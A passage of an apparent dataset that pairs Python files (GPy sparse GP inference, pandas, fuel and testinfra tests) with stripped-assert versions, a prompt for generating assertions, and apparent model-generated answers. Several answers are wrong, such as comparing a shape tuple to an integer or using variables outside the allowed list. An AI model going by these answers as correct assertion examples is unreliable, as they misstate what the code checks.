                       0.5*np.sum(np.square(b)) + \
                       trace_term

        # Compute dL_dKmm
        vvT_P = tdot(v.reshape(-1,1)) + P
        LAL = Li.T.dot(A).dot(Li)
        dL_dK = Kmmi - 0.5*(vvT_P + LAL)

        # Compute dL_dU
        vY = np.dot(v.reshape(-1,1),Y.T)
        #dL_dU = vY - np.dot(vvT_P, U.T)
        dL_dU = vY - np.dot(vvT_P - Kmmi, U.T)
        dL_dU *= beta

        #compute dL_dR
        Uv = np.dot(U, v)
        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1) )*beta**2
        dL_dR -=beta*trace_term/num_data

        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)
        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn) + -0.5*beta, 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}

        #construct a posterior object
        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)


        return post, log_marginal, grad_dict


","
1# Copyright (c) 2012-2014, James Hensman
2# Licensed under the BSD 3-clause license (see LICENSE.txt)
3
4from posterior import Posterior
5from ...util.linalg import jitchol, tdot, dtrtrs, dpotri, pdinv
6import numpy as np
7from . import LatentFunctionInference
8log_2_pi = np.log(2*np.pi)
9
10class DTC(LatentFunctionInference):
11    """"""
12    An object for inference when the likelihood is Gaussian, but we want to do sparse inference.
13
14    The function self.inference returns a Posterior object, which summarizes
15    the posterior.
16
17    NB. It's not recommended to use this function! It's here for historical purposes. 
18
19    """"""
20    def __init__(self):
21        self.const_jitter = 1e-6
22
23    def inference(self, kern, X, Z, likelihood, Y, Y_metadata=None):
24
25        num_inducing, _ = Z.shape
26        num_data, output_dim = Y.shape
27
28        #make sure the noise is not hetero
29        beta = 1./likelihood.gaussian_variance(Y_metadata)
30        if beta.size > 1:
31            raise NotImplementedError, ""no hetero noise with this implementation of DTC""
32
33        Kmm = kern.K(Z)
34        Knn = kern.Kdiag(X)
35        Knm = kern.K(X, Z)
36        U = Knm
37        Uy = np.dot(U.T,Y)
38
39        #factor Kmm
40        Kmmi, L, Li, _ = pdinv(Kmm)
41
42        # Compute A
43        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
44        A = tdot(LiUTbeta) + np.eye(num_inducing)
45
46        # factor A
47        LA = jitchol(A)
48
49        # back substutue to get b, P, v
50        tmp, _ = dtrtrs(L, Uy, lower=1)
51        b, _ = dtrtrs(LA, tmp*beta, lower=1)
52        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
53        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
54        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
55        P = tdot(tmp.T)
56
57        #compute log marginal
58        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
59                       -np.sum(np.log(np.diag(LA)))*output_dim + \
60                       0.5*num_data*output_dim*np.log(beta) + \
61                       -0.5*beta*np.sum(np.square(Y)) + \
62                       0.5*np.sum(np.square(b))
63
64        # Compute dL_dKmm
65        vvT_P = tdot(v.reshape(-1,1)) + P
66        dL_dK = 0.5*(Kmmi - vvT_P)
67
68        # Compute dL_dU
69        vY = np.dot(v.reshape(-1,1),Y.T)
70        dL_dU = vY - np.dot(vvT_P, U.T)
71        dL_dU *= beta
72
73        #compute dL_dR
74        Uv = np.dot(U, v)
75        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1))*beta**2
76
77        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)
78
79        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn), 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}
80
81        #construct a posterior object
82        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)
83
84        return post, log_marginal, grad_dict
85
86class vDTC(object):
87    def __init__(self):
88        self.const_jitter = 1e-6
89
90    def inference(self, kern, X, X_variance, Z, likelihood, Y, Y_metadata):
91
92        num_inducing, _ = Z.shape
93        num_data, output_dim = Y.shape
94
95        #make sure the noise is not hetero
96        beta = 1./likelihood.gaussian_variance(Y_metadata)
97        if beta.size > 1:
98            raise NotImplementedError, ""no hetero noise with this implementation of DTC""
99
100        Kmm = kern.K(Z)
101        Knn = kern.Kdiag(X)
102        Knm = kern.K(X, Z)
103        U = Knm
104        Uy = np.dot(U.T,Y)
105
106        #factor Kmm
107        Kmmi, L, Li, _ = pdinv(Kmm)
108
109        # Compute A
110        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
111        A_ = tdot(LiUTbeta)
112        trace_term = -0.5*(np.sum(Knn)*beta - np.trace(A_))
113        A = A_ + np.eye(num_inducing)
114
115        # factor A
116        LA = jitchol(A)
117
118        # back substutue to get b, P, v
119        tmp, _ = dtrtrs(L, Uy, lower=1)
120        b, _ = dtrtrs(LA, tmp*beta, lower=1)
121        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
122        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
123        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
124        P = tdot(tmp.T)
125        stop
126
127        #compute log marginal
128        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
129                       -np.sum(np.log(np.diag(LA)))*output_dim + \
130                       0.5*num_data*output_dim*np.log(beta) + \
131                       -0.5*beta*np.sum(np.square(Y)) + \
132                       0.5*np.sum(np.square(b)) + \
133                       trace_term
134
135        # Compute dL_dKmm
136        vvT_P = tdot(v.reshape(-1,1)) + P
137        LAL = Li.T.dot(A).dot(Li)
138        dL_dK = Kmmi - 0.5*(vvT_P + LAL)
139
140        # Compute dL_dU
141        vY = np.dot(v.reshape(-1,1),Y.T)
142        #dL_dU = vY - np.dot(vvT_P, U.T)
143        dL_dU = vY - np.dot(vvT_P - Kmmi, U.T)
144        dL_dU *= beta
145
146        #compute dL_dR
147        Uv = np.dot(U, v)
148        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1) )*beta**2
149        dL_dR -=beta*trace_term/num_data
150
151        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)
152        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn) + -0.5*beta, 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}
153
154        #construct a posterior object
155        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)
156
157
158        return post, log_marginal, grad_dict
159
160
161","[['X_variance', '==', 'None'], ['X_variance', '==', 'None']]",2,2,1.0,0.000366770584999,"['log_2_pi', 'self.const_jitter', 'kern', 'X', 'Z', 'likelihood', 'Y', 'Y_metadata', 'num_inducing', '_', 'num_data', 'output_dim', 'beta', 'Kmm', 'Knn', 'Knm', 'U', 'Uy', 'Kmmi', 'L', 'Li', 'LiUTbeta', 'A', 'LA', 'tmp', 'b', 'v', 'P', 'log_marginal', 'vvT_P', 'dL_dK', 'vY', 'dL_dU', 'Uv', 'dL_dR', 'dL_dthetaL', 'grad_dict', 'post', 'X_variance', 'A_', 'trace_term', 'LAL', '#dL_dU']",43,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['log_2_pi', 'self.const_jitter', 'kern', 'X', 'Z', 'likelihood', 'Y', 'Y_metadata', 'num_inducing', '_', 'num_data', 'output_dim', 'beta', 'Kmm', 'Knn', 'Knm', 'U', 'Uy', 'Kmmi', 'L', 'Li', 'LiUTbeta', 'A', 'LA', 'tmp', 'b', 'v', 'P', 'log_marginal', 'vvT_P', 'dL_dK', 'vY', 'dL_dU', 'Uv', 'dL_dR', 'dL_dthetaL', 'grad_dict', 'post', 'X_variance', 'A_', 'trace_term', 'LAL', '#dL_dU']
*Code:

1# Copyright (c) 2012-2014, James Hensman
2# Licensed under the BSD 3-clause license (see LICENSE.txt)
3
4from posterior import Posterior
5from ...util.linalg import jitchol, tdot, dtrtrs, dpotri, pdinv
6import numpy as np
7from . import LatentFunctionInference
8log_2_pi = np.log(2*np.pi)
9
10class DTC(LatentFunctionInference):
11    """"""
12    An object for inference when the likelihood is Gaussian, but we want to do sparse inference.
13
14    The function self.inference returns a Posterior object, which summarizes
15    the posterior.
16
17    NB. It's not recommended to use this function! It's here for historical purposes. 
18
19    """"""
20    def __init__(self):
21        self.const_jitter = 1e-6
22
23    def inference(self, kern, X, Z, likelihood, Y, Y_metadata=None):
24
25        num_inducing, _ = Z.shape
26        num_data, output_dim = Y.shape
27
28        #make sure the noise is not hetero
29        beta = 1./likelihood.gaussian_variance(Y_metadata)
30        if beta.size > 1:
31            raise NotImplementedError, ""no hetero noise with this implementation of DTC""
32
33        Kmm = kern.K(Z)
34        Knn = kern.Kdiag(X)
35        Knm = kern.K(X, Z)
36        U = Knm
37        Uy = np.dot(U.T,Y)
38
39        #factor Kmm
40        Kmmi, L, Li, _ = pdinv(Kmm)
41
42        # Compute A
43        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
44        A = tdot(LiUTbeta) + np.eye(num_inducing)
45
46        # factor A
47        LA = jitchol(A)
48
49        # back substutue to get b, P, v
50        tmp, _ = dtrtrs(L, Uy, lower=1)
51        b, _ = dtrtrs(LA, tmp*beta, lower=1)
52        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
53        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
54        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
55        P = tdot(tmp.T)
56
57        #compute log marginal
58        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
59                       -np.sum(np.log(np.diag(LA)))*output_dim + \
60                       0.5*num_data*output_dim*np.log(beta) + \
61                       -0.5*beta*np.sum(np.square(Y)) + \
62                       0.5*np.sum(np.square(b))
63
64        # Compute dL_dKmm
65        vvT_P = tdot(v.reshape(-1,1)) + P
66        dL_dK = 0.5*(Kmmi - vvT_P)
67
68        # Compute dL_dU
69        vY = np.dot(v.reshape(-1,1),Y.T)
70        dL_dU = vY - np.dot(vvT_P, U.T)
71        dL_dU *= beta
72
73        #compute dL_dR
74        Uv = np.dot(U, v)
75        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1))*beta**2
76
77        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)
78
79        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn), 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}
80
81        #construct a posterior object
82        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)
83
84        return post, log_marginal, grad_dict
85
86class vDTC(object):
87    def __init__(self):
88        self.const_jitter = 1e-6
89
90    def inference(self, kern, X, X_variance, Z, likelihood, Y, Y_metadata):
91
92        num_inducing, _ = Z.shape
93        num_data, output_dim = Y.shape
94
95        #make sure the noise is not hetero
96        beta = 1./likelihood.gaussian_variance(Y_metadata)
97        if beta.size > 1:
98            raise NotImplementedError, ""no hetero noise with this implementation of DTC""
99
100        Kmm = kern.K(Z)
101        Knn = kern.Kdiag(X)
102        Knm = kern.K(X, Z)
103        U = Knm
104        Uy = np.dot(U.T,Y)
105
106        #factor Kmm
107        Kmmi, L, Li, _ = pdinv(Kmm)
108
109        # Compute A
110        LiUTbeta = np.dot(Li, U.T)*np.sqrt(beta)
111        A_ = tdot(LiUTbeta)
112        trace_term = -0.5*(np.sum(Knn)*beta - np.trace(A_))
113        A = A_ + np.eye(num_inducing)
114
115        # factor A
116        LA = jitchol(A)
117
118        # back substutue to get b, P, v
119        tmp, _ = dtrtrs(L, Uy, lower=1)
120        b, _ = dtrtrs(LA, tmp*beta, lower=1)
121        tmp, _ = dtrtrs(LA, b, lower=1, trans=1)
122        v, _ = dtrtrs(L, tmp, lower=1, trans=1)
123        tmp, _ = dtrtrs(LA, Li, lower=1, trans=0)
124        P = tdot(tmp.T)
125        stop
126
127        #compute log marginal
128        log_marginal = -0.5*num_data*output_dim*np.log(2*np.pi) + \
129                       -np.sum(np.log(np.diag(LA)))*output_dim + \
130                       0.5*num_data*output_dim*np.log(beta) + \
131                       -0.5*beta*np.sum(np.square(Y)) + \
132                       0.5*np.sum(np.square(b)) + \
133                       trace_term
134
135        # Compute dL_dKmm
136        vvT_P = tdot(v.reshape(-1,1)) + P
137        LAL = Li.T.dot(A).dot(Li)
138        dL_dK = Kmmi - 0.5*(vvT_P + LAL)
139
140        # Compute dL_dU
141        vY = np.dot(v.reshape(-1,1),Y.T)
142        #dL_dU = vY - np.dot(vvT_P, U.T)
143        dL_dU = vY - np.dot(vvT_P - Kmmi, U.T)
144        dL_dU *= beta
145
146        #compute dL_dR
147        Uv = np.dot(U, v)
148        dL_dR = 0.5*(np.sum(U*np.dot(U,P), 1) - 1./beta + np.sum(np.square(Y), 1) - 2.*np.sum(Uv*Y, 1) + np.sum(np.square(Uv), 1) )*beta**2
149        dL_dR -=beta*trace_term/num_data
150
151        dL_dthetaL = likelihood.exact_inference_gradients(dL_dR)
152        grad_dict = {'dL_dKmm': dL_dK, 'dL_dKdiag':np.zeros_like(Knn) + -0.5*beta, 'dL_dKnm':dL_dU.T, 'dL_dthetaL':dL_dthetaL}
153
154        #construct a posterior object
155        post = Posterior(woodbury_inv=Kmmi-P, woodbury_vector=v, K=Kmm, mean=None, cov=None, K_chol=L)
156
157
158        return post, log_marginal, grad_dict
159
160
161",7432,"[[25, 'Z.shape', '==', 2, ""to make sure Z has the correct number of dimensions""],
[26, 'Y.shape', '==', 2, ""to make sure the output Y has the correct number of dimensions""],
[30, 'beta.size', '==', 1, ""to check if the noise is not hetero""],
[33, 'Kmm.shape', '==', 2, ""to validate Kmm has the correct dimensions""],
[34, 'Knn.shape', '==', 1, ""to validate Knn is a one-dimensional list""],
[35, 'Knm.shape', '==', 2, ""to validate Knm has the correct number of dimensions""],
[36, 'U.shape', '==', 2, ""to validate U has the correct number of dimensions""],
[39, 'Kmmi.shape', '==', 2, ""to validate the inverse of Kmm has correct dimensions""],
[44, 'A.shape', '==', 2, ""to validate A has the correct number of dimensions""],
[47, 'LA.shape', '==', 2, ""to validate LA has the correct number of dimensions""],
[80, 'post', '!=', None, ""the posterior object must exist""],
[81, 'grad_dict', '!=', None, ""the gradient dictionary must exist""],
[92, 'Z.shape', '==', 2, ""to make sure Z has the correct number of dimensions""],
[93, 'Y.shape', '==', 2, ""to make sure the output Y has the correct number of dimensions""],
[96, 'beta.size', '==', 1, ""to check if the noise is not hetero""],
[100, 'Kmm.shape', '==', 2, ""to validate Kmm has the correct dimensions""],
[101, 'Knn.shape', '==', 1, ""to validate Knn is a one-dimensional list""],
[102, 'Knm.shape', '==', 2, ""to validate Knm has the correct number of dimensions""],
[103, 'U.shape', '==', 2, ""to validate U has the correct number of dimensions""],
[107, 'Kmmi.shape', '==', 2, ""to validate the inverse of Kmm has correct dimensions""],
[113, 'A.shape', '==', 2, ""to validate A has the correct number of dimensions""],
[116, 'LA.shape', '==', 2, ""to validate LA has the correct number of dimensions""],
[152, 'grad_dict', '!=', None, ""the gradient dictionary must exist""],
[154, 'post', '!=', None, ""the posterior object must exist""]]"
AartGoossens/athletic_pandas,"import pandas as pd
import pytest

from athletic_pandas.algorithms import heartrate_models


def test_heartrate_model():
    heartrate = pd.Series(range(50))
    power = pd.Series(range(0, 100, 2))

    model, predictions = heartrate_models.heartrate_model(heartrate, power)

    assert model.params['hr_rest'].value == 0.00039182374117378518
    assert model.params['hr_max'].value == 195.75616175654685
    assert model.params['dhr'].value == 0.49914432620946803
    assert model.params['tau_rise'].value == 0.98614419733274383
    assert model.params['tau_fall'].value == 22.975975612579408
    assert model.params['hr_drift'].value == 6.7232899323328612 * 10**-5
    assert len(predictions) == 50
","
1import pandas as pd
2import pytest
3
4from athletic_pandas.algorithms import heartrate_models
5
6
7def test_heartrate_model():
8    heartrate = pd.Series(range(50))
9    power = pd.Series(range(0, 100, 2))
10
11    model, predictions = heartrate_models.heartrate_model(heartrate, power)
12
13","[[""model.params['hr_rest'].value"", '==', '0.00039182374117378518'], [""model.params['hr_max'].value"", '==', '195.75616175654685'], [""model.params['dhr'].value"", '==', '0.49914432620946803'], [""model.params['tau_rise'].value"", '==', '0.98614419733274383'], [""model.params['tau_fall'].value"", '==', '22.975975612579408'], [""model.params['hr_drift'].value"", '==', '6.7232899323328612 * 10**-5'], ['len(predictions)', '==', '50']]",7,7,1.0,0.0099857346647646,"['heartrate', 'power', 'model', 'predictions']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['heartrate', 'power', 'model', 'predictions']
*Code:

1import pandas as pd
2import pytest
3
4from athletic_pandas.algorithms import heartrate_models
5
6
7def test_heartrate_model():
8    heartrate = pd.Series(range(50))
9    power = pd.Series(range(0, 100, 2))
10
11    model, predictions = heartrate_models.heartrate_model(heartrate, power)
12
13",1720,"[[8, 'heartrate', '==', 50, ""heartrate should contain 50 elements""],
 [9, 'power', '==', 50, ""power should contain 50 elements""],
 [12, 'model', '!=', None, ""model shouldn't be None after heartrate_model execution""],
 [12, 'predictions', '!=', None, ""predictions shouldn't be None after heartrate_model execution""]]"
dmitriy-serdyuk/fuel,"import numpy
from numpy.testing import assert_raises

from fuel.datasets import CalTech101Silhouettes
from tests import skip_if_not_available


def test_caltech101_silhouettes16():
    skip_if_not_available(datasets=['caltech101_silhouettes16.hdf5'])
    for which_set, size, num_examples in (
            ('train', 16, 4082), ('valid', 16, 2257), ('test', 16, 2302)):
        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
                                   load_in_memory=False)

        assert ds.num_examples == num_examples

        handle = ds.open()
        features, targets = ds.get_data(handle, slice(0, 10))

        assert features.shape == (10, 1, size, size)
        assert targets.shape == (10, 1)

        assert features.dtype == numpy.uint8
        assert targets.dtype == numpy.uint8


def test_caltech101_silhouettes_unkn_size():
    assert_raises(ValueError, CalTech101Silhouettes,
                  which_sets=['test'], size=10)


def test_caltech101_silhouettes28():
    skip_if_not_available(datasets=['caltech101_silhouettes28.hdf5'])
    for which_set, size, num_examples in (
            ('train', 28, 4100), ('valid', 28, 2264), ('test', 28, 2307)):
        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
                                   load_in_memory=False)

        assert ds.num_examples == num_examples

        handle = ds.open()
        features, targets = ds.get_data(handle, slice(0, 10))

        assert features.shape == (10, 1, size, size)
        assert targets.shape == (10, 1)

        assert features.dtype == numpy.uint8
        assert targets.dtype == numpy.uint8
","
1import numpy
2
3from fuel.datasets import CalTech101Silhouettes
4from tests import skip_if_not_available
5
6
7def test_caltech101_silhouettes16():
8    skip_if_not_available(datasets=['caltech101_silhouettes16.hdf5'])
9    for which_set, size, num_examples in (
10            ('train', 16, 4082), ('valid', 16, 2257), ('test', 16, 2302)):
11        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
12                                   load_in_memory=False)
13
14
15        handle = ds.open()
16        features, targets = ds.get_data(handle, slice(0, 10))
17
18
19
20
21def test_caltech101_silhouettes_unkn_size():
22                  which_sets=['test'], size=10)
23
24
25def test_caltech101_silhouettes28():
26    skip_if_not_available(datasets=['caltech101_silhouettes28.hdf5'])
27    for which_set, size, num_examples in (
28            ('train', 28, 4100), ('valid', 28, 2264), ('test', 28, 2307)):
29        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
30                                   load_in_memory=False)
31
32
33        handle = ds.open()
34        features, targets = ds.get_data(handle, slice(0, 10))
35
36
37","[['ds.num_examples', '==', 'num_examples'], ['features.shape', '==', '(10'], ['targets.shape', '==', '(10'], ['features.dtype', '==', 'numpy.uint8'], ['targets.dtype', '==', 'numpy.uint8'], ['ds.num_examples', '==', 'num_examples'], ['features.shape', '==', '(10'], ['targets.shape', '==', '(10'], ['features.dtype', '==', 'numpy.uint8'], ['targets.dtype', '==', 'numpy.uint8']]",12,10,0.8333333333333334,0.0060901339829476,"['ds', 'handle', 'features', 'targets']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['ds', 'handle', 'features', 'targets']
*Code:

1import numpy
2
3from fuel.datasets import CalTech101Silhouettes
4from tests import skip_if_not_available
5
6
7def test_caltech101_silhouettes16():
8    skip_if_not_available(datasets=['caltech101_silhouettes16.hdf5'])
9    for which_set, size, num_examples in (
10            ('train', 16, 4082), ('valid', 16, 2257), ('test', 16, 2302)):
11        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
12                                   load_in_memory=False)
13
14
15        handle = ds.open()
16        features, targets = ds.get_data(handle, slice(0, 10))
17
18
19
20
21def test_caltech101_silhouettes_unkn_size():
22                  which_sets=['test'], size=10)
23
24
25def test_caltech101_silhouettes28():
26    skip_if_not_available(datasets=['caltech101_silhouettes28.hdf5'])
27    for which_set, size, num_examples in (
28            ('train', 28, 4100), ('valid', 28, 2264), ('test', 28, 2307)):
29        ds = CalTech101Silhouettes(which_sets=[which_set], size=size,
30                                   load_in_memory=False)
31
32
33        handle = ds.open()
34        features, targets = ds.get_data(handle, slice(0, 10))
35
36
37",2576,"[[7, 'datasets', '!=', None, 'datasets available must be checked before usage'],
 [10, 'size', '==', 16, 'size should be equal to 16 as asserted for CalTech101Silhouettes ds (line 11)'],
 [10, 'num_examples', '>=', 1, 'num_examples should be at least 1 to iterate over (line 10)'],
 [15, 'handle', '!=', None, 'handle should be initialised (line 15)'],
 [16, 'features', '!=', None, 'features should be initialised (line 16)'],
 [16, 'targets', '!=', None, 'targets should be initialised (line 16)'],
 [25, 'size', '==', 28, 'size should be equal to 28 as asserted for CalTech101Silhouettes ds (line 29)'],
 [25, 'num_examples', '>=', 1, 'num_examples should be at least 1 to iterate over (line 25)'],
 [33, 'handle', '!=', None, 'handle should be initialised (line 33)'],
 [34, 'features', '!=', None, 'features should be initialised (line 34)'],
 [34, 'targets', '!=', None, 'targets should be initialised (line 34)']]"
CorbanR/ansible-crystal,"import os
import pytest
import testinfra
from testinfra.utils.ansible_runner import AnsibleRunner

testinfra_hosts = AnsibleRunner(
    os.environ['MOLECULE_INVENTORY_FILE']).get_hosts('all')


def test_hosts_file(host):
    """"""basic test, to ensure testinfra works""""""
    f = host.file('/etc/hosts')

    assert f.exists
    assert f.user == 'root'
    assert f.group == 'root'


def test_crystal_output(host):
    """"""check that crystal is installed""""""
    crystal = host.ansible(""shell"",
                           ""crystal --version | awk '{print $2}'"",
                           check=False)[""stdout""]
    assert crystal >= ""1.0.0""
","
1import os
2import pytest
3import testinfra
4from testinfra.utils.ansible_runner import AnsibleRunner
5
6testinfra_hosts = AnsibleRunner(
7    os.environ['MOLECULE_INVENTORY_FILE']).get_hosts('all')
8
9
10def test_hosts_file(host):
11    """"""basic test, to ensure testinfra works""""""
12    f = host.file('/etc/hosts')
13
14
15
16def test_crystal_output(host):
17    """"""check that crystal is installed""""""
18    crystal = host.ansible(""shell"",
19                           ""crystal --version | awk '{print $2}'"",
20                           check=False)[""stdout""]
21","[['f.exists', '==', 'True'], ['f.user', '==', ""'root'""], ['f.group', '==', ""'root'""], ['crystal', '>=', '""1.0.0""']]",4,4,1.0,0.0062794348508634,"['testinfra_hosts', 'host', 'f', 'crystal']",4,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['testinfra_hosts', 'host', 'f', 'crystal']
*Code:

1import os
2import pytest
3import testinfra
4from testinfra.utils.ansible_runner import AnsibleRunner
5
6testinfra_hosts = AnsibleRunner(
7    os.environ['MOLECULE_INVENTORY_FILE']).get_hosts('all')
8
9
10def test_hosts_file(host):
11    """"""basic test, to ensure testinfra works""""""
12    f = host.file('/etc/hosts')
13
14
15
16def test_crystal_output(host):
17    """"""check that crystal is installed""""""
18    crystal = host.ansible(""shell"",
19                           ""crystal --version | awk '{print $2}'"",
20                           check=False)[""stdout""]
21",1987,"[[10, 'host', '!=', None, ""host should not be None for test to run correctly""],
 [16, 'host', '!=', None, ""host should not be None for test to run correctly""],
 [20, 'crystal', '!=', None, ""crystal should not be None to check the version""]]"
kelle/astropy,"# Licensed under a 3-clause BSD style license - see LICENSE.rst
""""""Tests for `astropy.vo.validator.validate`.

.. note::

    This test will fail if external URL query status
    changes. This is beyond the control of AstroPy.
    When this happens, rerun or update the test.

""""""
from __future__ import absolute_import, division, print_function, unicode_literals

# STDLIB
import os
import shutil
import tempfile
import warnings

import pytest

# LOCAL
from .. import conf
from .. import validate
from ...client.vos_catalog import VOSDatabase
from ....tests.helper import remote_data
from ....utils.data import get_pkg_data_filename
from ....utils.exceptions import AstropyDeprecationWarning
from ....utils import data


__doctest_skip__ = ['*']


def setup_module():
    """"""Ignore all deprecation warnings here.""""""
    warnings.simplefilter('ignore', AstropyDeprecationWarning)


def teardown_module():
    warnings.resetwarnings()


@remote_data
class TestConeSearchValidation(object):
    """"""Validation on a small subset of Cone Search sites.""""""
    def setup_class(self):
        self.datadir = 'data'
        self.out_dir = tempfile.mkdtemp()
        self.filenames = {
            'good': 'conesearch_good.json',
            'warn': 'conesearch_warn.json',
            'excp': 'conesearch_exception.json',
            'nerr': 'conesearch_error.json'}

        conf.conesearch_master_list = get_pkg_data_filename(os.path.join(
            self.datadir, 'vao_conesearch_sites_121107_subset.xml'))

        data.conf.remote_timeout = 30

    @staticmethod
    def _compare_catnames(fname1, fname2):
        db1 = VOSDatabase.from_json(fname1)
        db2 = VOSDatabase.from_json(fname2)
        assert db1.list_catalogs() == db2.list_catalogs()

    @pytest.mark.parametrize(('parallel'), [True, False])
    def test_validation(self, parallel):
        if os.path.exists(self.out_dir):
